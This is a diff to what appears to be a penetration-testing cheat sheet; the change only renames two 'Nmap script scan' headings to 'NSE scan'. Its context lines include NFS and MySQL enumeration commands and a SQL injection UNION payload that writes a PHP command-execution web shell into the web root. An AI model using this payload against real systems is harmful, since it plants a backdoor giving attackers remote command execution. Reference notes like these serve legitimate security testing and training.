@@ -327,7 +327,7 @@ nmap --script=nfs-showmount -oN mountable_shares <IP>
 sudo mount -v -t nfs <IP>:<SHARE> /mnt/test
 ~~~
 
-## Nmap script scan
+## NSE scan
 
 ~~~ bash
 sudo nmap -p 111,2049 -Pn -n --open -sV --script="nfs-*" <IP>
@@ -355,7 +355,7 @@ show databases;
 ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
 ~~~
 
-## Nmap script scan
+## NSE scan
 
 ~~~ bash
 sudo nmap -p 3306 -Pn -n --open -sV -sC --script="mysql-*" <IP>
